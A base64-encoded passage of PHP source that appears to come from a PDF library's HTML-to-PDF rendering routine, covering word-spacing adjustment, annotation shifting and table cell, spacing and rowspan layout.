Ghpcy0+aykgPD0gKCRjdXJyZW50eHBvcyArICR0aGlzLT5mZXBzKSkpIHsKCQkJCQkJCQkJCQkJaWYgKCRjeHBvcyA+ICRsbXBvcykgewoJCQkJCQkJCQkJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdWyRwYWtdWyd4J10gKz0gKCRzcGFjZXcgLyAkdGhpcy0+ayk7CgkJCQkJCQkJCQkJCQkkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV1bJHBha11bJ3cnXSArPSAoKCRzcGFjZXdpZHRoICogJHBhY1snbnVtc3BhY2VzJ10pIC8gJHRoaXMtPmspOwoJCQkJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdWyRwYWtdWyd3J10gKz0gKCgkc3BhY2V3aWR0aCAqICRwYWNbJ251bXNwYWNlcyddKSAvICR0aGlzLT5rKTsKCQkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0KCQkJCQkJCQl9IC8vIGVuZCBvZiB3aGlsZQoJCQkJCQkJCS8vIHJlbW92ZSBtYXJrZXJzCgkJCQkJCQkJJHBtaWQgPSBzdHJfcmVwbGFjZSgneCojISMqeCcsICcnLCAkcG1pZCk7CgkJCQkJCQkJaWYgKCR0aGlzLT5pc1VuaWNvZGVGb250KCkpIHsKCQkJCQkJCQkJLy8gbXVsdGlieXRlIGNoYXJhY3RlcnMKCQkJCQkJCQkJJHNwYWNldyA9ICRzcGFjZXdpZHRodTsKCQkJCQkJCQkJaWYgKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgIT0gMTAwKSB7CgkJCQkJCQkJCQkvLyB3b3JkIHNwYWNpbmcgaXMgYWZmZWN0ZWQgYnkgc3RyZXRjaGluZwoJCQkJCQkJCQkJJHNwYWNldyAvPSAoJHRoaXMtPmZvbnRfc3RyZXRjaGluZyAvIDEwMCk7CgkJCQkJCQkJCX0KCQkJCQkJCQkJLy8gZXNjYXBlIHNwZWNpYWwgY2hhcmFjdGVycwoJCQkJCQkJCQkkcG9zID0gMDsKCQkJCQkJCQkJJHBtaWQgPSBwcmVnX3JlcGxhY2UoJy9bXFxcXVtcKF0veCcsICdcXCMhI09QIyEjJywgJHBtaWQpOwoJCQkJCQkJCQkkcG1pZCA9IHByZWdfcmVwbGFjZSgnL1tcXFxdW1wpXS94JywgJ1xcIyEjQ1AjISMnLCAkcG1pZCk7CgkJCQkJCQkJCWlmIChwcmVnX21hdGNoX2FsbCgnL1xbXCgoW15cKV0qKVwpXF0veCcsICRwbWlkLCAkcGFtYXRjaCkgPiAwKSB7CgkJCQkJCQkJCQlmb3JlYWNoKCRwYW1hdGNoWzBdIGFzICRwayA9PiAkcG1hdGNoKSB7CgkJCQkJCQkJCQkJJHJlcGxhY2UgPSAkcGFtYXRjaFsxXVskcGtdOwoJCQkJCQkJCQkJCSRyZXBsYWNlID0gc3RyX3JlcGxhY2UoJyMhI09QIyEjJywgJygnLCAkcmVwbGFjZSk7CgkJCQkJCQkJCQkJJHJlcGxhY2UgPSBzdHJfcmVwbGFjZSgnIyEjQ1AjISMnLCAnKScsICRyZXBsYWNlKTsKCQkJCQkJCQkJCQkkbmV3cG1pZCA9ICdbKCcuc3RyX3JlcGxhY2UoY2hyKDApLmNocigzMiksICcpICcuc3ByaW50ZignJUYnLCAkc3BhY2V3KS4nICgnLCAkcmVwbGFjZSkuJyldJzsKCQkJCQkJCQkJCQkkcG9zID0gc3RycG9zKCRwbWlkLCAkcG1hdGNoLCAkcG9zKTsKCQkJCQkJCQkJCQlpZiAoJHBvcyAhPT0gRkFMU0UpIHsKCQkJCQkJCQkJCQkJJHBtaWQgPSBzdWJzdHJfcmVwbGFjZSgkcG1pZCwgJG5ld3BtaWQsICRwb3MsIHN0cmxlbigkcG1hdGNoKSk7CgkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCSsrJHBvczsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCXVuc2V0KCRwYW1hdGNoKTsKCQkJCQkJCQkJfQoJCQkJCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSA9ICRwc3RhcnQuIlxuIi4kcG1pZC4iXG4iLiRwZW5kOwoJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UsICRwc3RhcnQuIlxuIi4kcG1pZC4iXG4iLiRwZW5kKTsKCQkJCQkJCQkJfQoJCQkJCQkJCQkkZW5kbGluZXBvcyA9IHN0cmxlbigkcHN0YXJ0LiJcbiIuJHBtaWQuIlxuIik7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJLy8gbm9uLXVuaWNvZGUgKHNpbmdsZS1ieXRlIGNoYXJhY3RlcnMpCgkJCQkJCQkJCWlmICgkdGhpcy0+Zm9udF9zdHJldGNoaW5nICE9IDEwMCkgewoJCQkJCQkJCQkJLy8gd29yZCBzcGFjaW5nIChUdykgaXMgYWZmZWN0ZWQgYnkgc3RyZXRjaGluZwoJCQkJCQkJCQkJJHNwYWNld2lkdGggLz0gKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgLyAxMDApOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRycyA9IHNwcmludGYoJyVGIFR3JywgJHNwYWNld2lkdGgpOwoJCQkJCQkJCQkkcG1pZCA9IHByZWdfcmVwbGFjZSgiL1xbXCgveCIsICRycy4nIFsoJywgJHBtaWQpOwoJCQkJCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSA9ICRwc3RhcnQuIlxuIi4kcG1pZC4iXG5CVCAwIFR3IEVUXG4iLiRwZW5kOwoJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UsICRwc3RhcnQuIlxuIi4kcG1pZC4iXG5CVCAwIFR3IEVUXG4iLiRwZW5kKTsKCQkJCQkJCQkJfQoJCQkJCQkJCQkkZW5kbGluZXBvcyA9IHN0cmxlbigkcHN0YXJ0LiJcbiIuJHBtaWQuIlxuQlQgMCBUdyBFVFxuIik7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9IC8vIGVuZCBvZiBKCgkJCQkJfSAvLyBlbmQgaWYgJHN0YXJ0bGluZXgKCQkJCQlpZiAoKCR0X3ggIT0gMCkgT1IgKCR5c2hpZnQgPCAwKSkgewoJCQkJCQkvLyBzaGlmdCB0aGUgbGluZQoJCQkJCQkkdHJ4ID0gc3ByaW50ZignMSAwIDAgMSAlRiAlRiBjbScsICgkdF94ICogJHRoaXMtPmspLCAoJHlzaGlmdCAqICR0aGlzLT5rKSk7CgkJCQkJCSRwc3RhcnQgLj0gIlxucVxuIi4kdHJ4LiJcbiIuJHBtaWQuIlxuUVxuIjsKCQkJCQkJJGVuZGxpbmVwb3MgPSBzdHJsZW4oJHBzdGFydCk7CgkJCQkJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCQkJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddID0gJHBzdGFydC4kcGVuZDsKCQkJCQkJCWZvcmVhY2ggKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnYW5ub3RhdGlvbnMnXSBhcyAkcGFrID0+ICRwYWMpIHsKCQkJCQkJCQlpZiAoJHBhayA+PSAkcGFzaykgewoJCQkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2Fubm90YXRpb25zJ11bJHBha11bJ3gnXSArPSAkdF94OwoJCQkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2Fubm90YXRpb25zJ11bJHBha11bJ3knXSAtPSAkeXNoaWZ0OwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlLCAkcHN0YXJ0LiRwZW5kKTsKCQkJCQkJCS8vIHNoaWZ0IHRoZSBhbm5vdGF0aW9ucyBhbmQgbGlua3MKCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJCQkJZm9yZWFjaCAoJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdIGFzICRwYWsgPT4gJHBhYykgewoJCQkJCQkJCQlpZiAoJHBhayA+PSAkcGFzaykgewoJCQkJCQkJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdWyRwYWtdWyd4J10gKz0gJHRfeDsKCQkJCQkJCQkJCSR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXVskcGFrXVsneSddIC09ICR5c2hpZnQ7CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJJHRoaXMtPnkgLT0gJHlzaGlmdDsKCQkJCQl9CgkJCQl9CgkJCQkkcGJyayA9ICR0aGlzLT5jaGVja1BhZ2VCcmVhaygkdGhpcy0+bGFzdGgpOwoJCQkJJHRoaXMtPm5ld2xpbmUgPSBmYWxzZTsKCQkJCSRzdGFydGxpbmV4ID0gJHRoaXMtPng7CgkJCQkkc3RhcnRsaW5leSA9ICR0aGlzLT55OwoJCQkJaWYgKCRkb21bJGRvbVska2V5XVsncGFyZW50J11dWyd2YWx1ZSddID09ICdzdXAnKSB7CgkJCQkJJHN0YXJ0bGluZXkgLT0gKCgwLjMgKiAkdGhpcy0+Rm9udFNpemVQdCkgLyAkdGhpcy0+ayk7CgkJCQl9IGVsc2VpZiAoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3ZhbHVlJ10gPT0gJ3N1YicpIHsKCQkJCQkkc3RhcnRsaW5leSAtPSAoKCR0aGlzLT5Gb250U2l6ZVB0IC8gMC43KSAvICR0aGlzLT5rKTsKCQkJCX0gZWxzZSB7CgkJCQkJJG1pbnN0YXJ0bGluZXkgPSAkc3RhcnRsaW5leTsKCQkJCQkkbWF4Ym90dG9tbGluZXkgPSAoJHRoaXMtPnkgKyAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkZm9udHNpemUgLyAkdGhpcy0+aykpOwoJCQkJfQoJCQkJJHN0YXJ0bGluZXBhZ2UgPSAkdGhpcy0+cGFnZTsKCQkJCWlmIChpc3NldCgkZW5kbGluZXBvcykgQU5EICghJHBicmspKSB7CgkJCQkJJHN0YXJ0bGluZXBvcyA9ICRlbmRsaW5lcG9zOwoJCQkJfSBlbHNlIHsKCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJCQkJJHN0YXJ0bGluZXBvcyA9IHN0cmxlbigkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSk7CgkJCQkJfSBlbHNlaWYgKCEkdGhpcy0+SW5Gb290ZXIpIHsKCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHRoaXMtPnBhZ2VdKSkgewoJCQkJCQkJJHRoaXMtPmZvb3RlcnBvc1skdGhpcy0+cGFnZV0gPSAkdGhpcy0+cGFnZWxlblskdGhpcy0+cGFnZV0gLSAkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR0aGlzLT5mb290ZXJwb3NbJHRoaXMtPnBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHRoaXMtPnBhZ2VdOwoJCQkJCQl9CgkJCQkJCSRzdGFydGxpbmVwb3MgPSAkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkc3RhcnRsaW5lcG9zID0gJHRoaXMtPnBhZ2VsZW5bJHRoaXMtPnBhZ2VdOwoJCQkJCX0KCQkJCX0KCQkJCXVuc2V0KCRlbmRsaW5lcG9zKTsKCQkJCSRwbGFsaWduID0gJGxhbGlnbjsKCQkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJJHBhc2sgPSBjb3VudCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pOwoJCQkJfSBlbHNlIHsKCQkJCQkkcGFzayA9IDA7CgkJCQl9CgkJCQlpZiAoISgkZG9tWyRrZXldWyd0YWcnXSBBTkQgISRkb21bJGtleV1bJ29wZW5pbmcnXSBBTkQgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3RhYmxlJykKCQkJCQlBTkQgKGlzc2V0KCR0aGlzLT5lbXB0eXBhZ2VtcmtbJHRoaXMtPnBhZ2VdKSkKCQkJCQlBTkQgKCR0aGlzLT5lbXB0eXBhZ2VtcmtbJHRoaXMtPnBhZ2VdID09ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXSkpKSB7CgkJCQkJJHRoaXMtPnNldEZvbnQoJGZvbnRuYW1lLCAkZm9udHN0eWxlLCAkZm9udHNpemUpOwoJCQkJCWlmICgkd2ZpbGwpIHsKCQkJCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCR0aGlzLT5iZ2NvbG9yKTsKCQkJCQl9CgkJCQl9CgkJCX0gLy8gZW5kIG5ld2xpbmUKCQkJaWYgKGlzc2V0KCRvcGVudGFncG9zKSkgewoJCQkJdW5zZXQoJG9wZW50YWdwb3MpOwoJCQl9CgkJCWlmICgkZG9tWyRrZXldWyd0YWcnXSkgewoJCQkJaWYgKCRkb21bJGtleV1bJ29wZW5pbmcnXSkgewoJCQkJCS8vIGdldCB0ZXh0IGluZGVudGF0aW9uIChpZiBhbnkpCgkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3RleHQtaW5kZW50J10pIEFORCAkZG9tWyRrZXldWydibG9jayddKSB7CgkJCQkJCSR0aGlzLT50ZXh0aW5kZW50ID0gJGRvbVska2V5XVsndGV4dC1pbmRlbnQnXTsKCQkJCQkJJHRoaXMtPm5ld2xpbmUgPSB0cnVlOwoJCQkJCX0KCQkJCQkvLyB0YWJsZQoJCQkJCWlmICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndGFibGUnKSBBTkQgaXNzZXQoJGRvbVska2V5XVsnY29scyddKSBBTkQgKCRkb21bJGtleV1bJ2NvbHMnXSA+IDApKSB7CgkJCQkJCS8vIGF2YWlsYWJsZSBwYWdlIHdpZHRoCgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkd3RtcCA9ICR0aGlzLT54IC0gJHRoaXMtPmxNYXJnaW47CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkd3RtcCA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkdGhpcy0+eDsKCQkJCQkJfQoJCQkJCQkvLyBnZXQgY2VsbCBzcGFjaW5nCgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnY2VsbHNwYWNpbmcnXSkpIHsKCQkJCQkJCSRjbHNwID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnY2VsbHNwYWNpbmcnXSwgMSwgJ3B4Jyk7CgkJCQkJCQkkY2VsbHNwYWNpbmcgPSBhcnJheSgnSCcgPT4gJGNsc3AsICdWJyA9PiAkY2xzcCk7CgkJCQkJCX0gZWxzZWlmIChpc3NldCgkZG9tWyRrZXldWydib3JkZXItc3BhY2luZyddKSkgewoJCQkJCQkJJGNlbGxzcGFjaW5nID0gJGRvbVska2V5XVsnYm9yZGVyLXNwYWNpbmcnXTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRjZWxsc3BhY2luZyA9IGFycmF5KCdIJyA9PiAwLCAnVicgPT4gMCk7CgkJCQkJCX0KCQkJCQkJLy8gdGFibGUgd2lkdGgKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3dpZHRoJ10pKSB7CgkJCQkJCQkkdGFibGVfd2lkdGggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRkb21bJGtleV1bJ3dpZHRoJ10sICR3dG1wLCAncHgnKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR0YWJsZV93aWR0aCA9ICR3dG1wOwoJCQkJCQl9CgkJCQkJCSR0YWJsZV93aWR0aCAtPSAoMiAqICRjZWxsc3BhY2luZ1snSCddKTsKCQkJCQkJaWYgKCEkdGhpcy0+aW50aGVhZCkgewoJCQkJCQkJJHRoaXMtPnkgKz0gJGNlbGxzcGFjaW5nWydWJ107CgkJCQkJCX0KCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCSRjZWxsc3BhY2luZ3ggPSAtJGNlbGxzcGFjaW5nWydIJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkY2VsbHNwYWNpbmd4ID0gJGNlbGxzcGFjaW5nWydIJ107CgkJCQkJCX0KCQkJCQkJLy8gdG90YWwgdGFibGUgd2lkdGggd2l0aG91dCBjZWxsc3BhY2VzCgkJCQkJCSR0YWJsZV9jb2x1bW5zX3dpZHRoID0gKCR0YWJsZV93aWR0aCAtICgkY2VsbHNwYWNpbmdbJ0gnXSAqICgkZG9tWyRrZXldWydjb2xzJ10gLSAxKSkpOwoJCQkJCQkvLyBtaW5pbXVtIGNvbHVtbiB3aWR0aAoJCQkJCQkkdGFibGVfbWluX2NvbHVtbl93aWR0aCA9ICgkdGFibGVfY29sdW1uc193aWR0aCAvICRkb21bJGtleV1bJ2NvbHMnXSk7CgkJCQkJCS8vIGFycmF5IG9mIGN1c3RvbSBjb2x1bW4gd2lkdGhzCgkJCQkJCSR0YWJsZV9jb2x3aWR0aHMgPSBhcnJheV9maWxsKDAsICRkb21bJGtleV1bJ2NvbHMnXSwgJHRhYmxlX21pbl9jb2x1bW5fd2lkdGgpOwoJCQkJCX0KCQkJCQkvLyB0YWJsZSByb3cKCQkJCQlpZiAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndHInKSB7CgkJCQkJCS8vIHJlc2V0IGNvbHVtbiBjb3VudGVyCgkJCQkJCSRjb2xpZCA9IDA7CgkJCQkJfQoJCQkJCS8vIHRhYmxlIGNlbGwKCQkJCQlpZiAoKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3RkJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3RoJykpIHsKCQkJCQkJJHRyaWQgPSAkZG9tWyRrZXldWydwYXJlbnQnXTsKCQkJCQkJJHRhYmxlX2VsID0gJGRvbVskdHJpZF1bJ3BhcmVudCddOwoJCQkJCQlpZiAoIWlzc2V0KCRkb21bJHRhYmxlX2VsXVsnY29scyddKSkgewoJCQkJCQkJJGRvbVskdGFibGVfZWxdWydjb2xzJ10gPSAkZG9tWyR0cmlkXVsnY29scyddOwoJCQkJCQl9CgkJCQkJCS8vIHN0b3JlIGJvcmRlciBpbmZvCgkJCQkJCSR0ZGJvcmRlciA9IDA7CgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydib3JkZXInXSkgQU5EICFlbXB0eSgkZG9tWyRrZXldWydib3JkZXInXSkpIHsKCQkJCQkJCSR0ZGJvcmRlciA9ICRkb21bJGtleV1bJ2JvcmRlciddOwoJCQkJCQl9CgkJCQkJCSRjb2xzcGFuID0gaW50dmFsKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydjb2xzcGFuJ10pOwoJCQkJCQlpZiAoJGNvbHNwYW4gPD0gMCkgewoJCQkJCQkJJGNvbHNwYW4gPSAxOwoJCQkJCQl9CgkJCQkJCSRvbGRfY2VsbF9wYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkJCQkJaWYgKGlzc2V0KCRkb21bKCRkb21bJHRyaWRdWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXVsnY2VsbHBhZGRpbmcnXSkpIHsKCQkJCQkJCSRjcmNscGQgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRkb21bKCRkb21bJHRyaWRdWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXVsnY2VsbHBhZGRpbmcnXSwgMSwgJ3B4Jyk7CgkJCQkJCQkkY3VycmVudF9jZWxsX3BhZGRpbmcgPSBhcnJheSgnTCcgPT4gJGNyY2xwZCwgJ1QnID0+ICRjcmNscGQsICdSJyA9PiAkY3JjbHBkLCAnQicgPT4gJGNyY2xwZCk7CgkJCQkJCX0gZWxzZWlmIChpc3NldCgkZG9tWygkZG9tWyR0cmlkXVsncGFyZW50J10pXVsncGFkZGluZyddKSkgewoJCQkJCQkJJGN1cnJlbnRfY2VsbF9wYWRkaW5nID0gJGRvbVsoJGRvbVskdHJpZF1bJ3BhcmVudCddKV1bJ3BhZGRpbmcnXTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRjdXJyZW50X2NlbGxfcGFkZGluZyA9IGFycmF5KCdMJyA9PiAwLCAnVCcgPT4gMCwgJ1InID0+IDAsICdCJyA9PiAwKTsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJGN1cnJlbnRfY2VsbF9wYWRkaW5nOwoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnaGVpZ2h0J10pKSB7CgkJCQkJCQkvLyBtaW5pbXVtIGNlbGwgaGVpZ2h0CgkJCQkJCQkkY2VsbGggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRkb21bJGtleV1bJ2hlaWdodCddLCAwLCAncHgnKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRjZWxsaCA9IDA7CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ2NvbnRlbnQnXSkpIHsKCQkJCQkJCSRjZWxsX2NvbnRlbnQgPSAkZG9tWyRrZXldWydjb250ZW50J107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkY2VsbF9jb250ZW50ID0gJyZuYnNwOyc7CgkJCQkJCX0KCQkJCQkJJHRhZ3R5cGUgPSAkZG9tWyRrZXldWyd2YWx1ZSddOwoJCQkJCQkkcGFyZW50aWQgPSAka2V5OwoJCQkJCQl3aGlsZSAoKCRrZXkgPCAkbWF4ZWwpIEFORCAoISgoJGRvbVska2V5XVsndGFnJ10pIEFORCAoISRkb21bJGtleV1bJ29wZW5pbmcnXSkgQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICR0YWd0eXBlKSBBTkQgKCRkb21bJGtleV1bJ3BhcmVudCddID09ICRwYXJlbnRpZCkpKSkgewoJCQkJCQkJLy8gbW92ZSAka2V5IGluZGV4IGZvcndhcmQKCQkJCQkJCSsrJGtleTsKCQkJCQkJfQoJCQkJCQlpZiAoIWlzc2V0KCRkb21bJHRyaWRdWydzdGFydHBhZ2UnXSkpIHsKCQkJCQkJCSRkb21bJHRyaWRdWydzdGFydHBhZ2UnXSA9ICR0aGlzLT5wYWdlOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHRoaXMtPnNldFBhZ2UoJGRvbVskdHJpZF1bJ3N0YXJ0cGFnZSddKTsKCQkJCQkJfQoJCQkJCQlpZiAoIWlzc2V0KCRkb21bJHRyaWRdWydzdGFydGNvbHVtbiddKSkgewoJCQkJCQkJJGRvbVskdHJpZF1bJ3N0YXJ0Y29sdW1uJ10gPSAkdGhpcy0+Y3VycmVudF9jb2x1bW47CgkJCQkJCX0gZWxzZWlmICgkdGhpcy0+Y3VycmVudF9jb2x1bW4gIT0gJGRvbVskdHJpZF1bJ3N0YXJ0Y29sdW1uJ10pIHsKCQkJCQkJCSR0bXB4ID0gJHRoaXMtPng7CgkJCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRkb21bJHRyaWRdWydzdGFydGNvbHVtbiddKTsKCQkJCQkJCSR0aGlzLT54ID0gJHRtcHg7CgkJCQkJCX0KCQkJCQkJaWYgKCFpc3NldCgkZG9tWyR0cmlkXVsnc3RhcnR5J10pKSB7CgkJCQkJCQkkZG9tWyR0cmlkXVsnc3RhcnR5J10gPSAkdGhpcy0+eTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR0aGlzLT55ID0gJGRvbVskdHJpZF1bJ3N0YXJ0eSddOwoJCQkJCQl9CgkJCQkJCWlmICghaXNzZXQoJGRvbVskdHJpZF1bJ3N0YXJ0eCddKSkgewoJCQkJCQkJJGRvbVskdHJpZF1bJ3N0YXJ0eCddID0gJHRoaXMtPng7CgkJCQkJCQkkdGhpcy0+eCArPSAkY2VsbHNwYWNpbmd4OwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHRoaXMtPnggKz0gKCRjZWxsc3BhY2luZ3ggLyAyKTsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRvbVskcGFyZW50aWRdWydhdHRyaWJ1dGUnXVsncm93c3BhbiddKSkgewoJCQkJCQkJJHJvd3NwYW4gPSBpbnR2YWwoJGRvbVskcGFyZW50aWRdWydhdHRyaWJ1dGUnXVsncm93c3BhbiddKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRyb3dzcGFuID0gMTsKCQkJCQkJfQoJCQkJCQkvLyBza2lwIHJvdy1zcGFubmVkIGNlbGxzIHN0YXJ0ZWQgb24gdGhlIHByZXZpb3VzIHJvd3MKCQkJCQkJaWYgKGlzc2V0KCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXSkpIHsKCQkJCQkJCSRyc2sgPSAwOwoJCQkJCQkJJHJza21heCA9IGNvdW50KCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXSk7CgkJCQkJCQl3aGlsZSAoJHJzayA8ICRyc2ttYXgpIHsKCQkJCQkJCQkkdHJ3c3AgPSAkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJHJza107CgkJCQkJCQkJJHJzc3RhcnR4ID0gJHRyd3NwWydzdGFydHgnXTsKCQkJCQkJCQkkcnNlbmR4ID0gJHRyd3NwWydlbmR4J107CgkJCQkJCQkJLy8gYWNjb3VudCBmb3IgbWFyZ2luIGNoYW5nZXMKCQkJCQkJCQlpZiAoJHRyd3NwWydzdGFydHBhZ2UnXSA8ICR0aGlzLT5wYWdlKSB7CgkJCQkJCQkJCWlmICgoJHRoaXMtPnJ0bCkgQU5EICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29ybSddICE9ICR0aGlzLT5wYWdlZGltWyR0cndzcFsnc3RhcnRwYWdlJ11dWydvcm0nXSkpIHsKCQkJCQkJCQkJCSRkbCA9ICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29ybSddIC0gJHRoaXMtPnBhZ2VkaW1bJHRyd3NwWydzdGFydHBhZ2UnXV1bJ29ybSddKTsKCQkJCQkJCQkJCSRyc3N0YXJ0eCAtPSAkZGw7CgkJCQkJCQkJCQkkcnNlbmR4IC09ICRkbDsKCQkJCQkJCQkJfSBlbHNlaWYgKCghJHRoaXMtPnJ0bCkgQU5EICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29sbSddICE9ICR0aGlzLT5wYWdlZGltWyR0cndzcFsnc3RhcnRwYWdlJ11dWydvbG0nXSkpIHsKCQkJCQkJCQkJCSRkbCA9ICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29sbSddIC0gJHRoaXMtPnBhZ2VkaW1bJHRyd3NwWydzdGFydHBhZ2UnXV1bJ29sbSddKTsKCQkJCQkJCQkJCSRyc3N0YXJ0eCArPSAkZGw7CgkJCQkJCQkJCQkkcnNlbmR4ICs9ICRkbDsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoKCR0cndzcFsncm93c3BhbiddID4gMCkKCQkJCQkJCQkJQU5EICgkcnNzdGFydHggPiAoJHRoaXMtPnggLSAkY2VsbHNwYWNpbmdbJ0gnXSAtICRjdXJyZW50X2NlbGxfcGFkZGluZ1snTCddIC0gJHRoaXMtPmZlcHMpKQoJCQkJCQkJCQlBTkQgKCRyc3N0YXJ0eCA8ICgkdGhpcy0+eCArICRjZWxsc3BhY2luZ1snSCddICsgJGN1cnJlbnRfY2VsbF9wYWRkaW5nWydSJ10gKyAkdGhpcy0+ZmVwcykpCgkJCQkJCQkJCUFORCAoKCR0cndzcFsnc3RhcnR5J10gPCAoJHRoaXMtPnkgLSAkdGhpcy0+ZmVwcykpIE9SICgkdHJ3c3BbJ3N0YXJ0cGF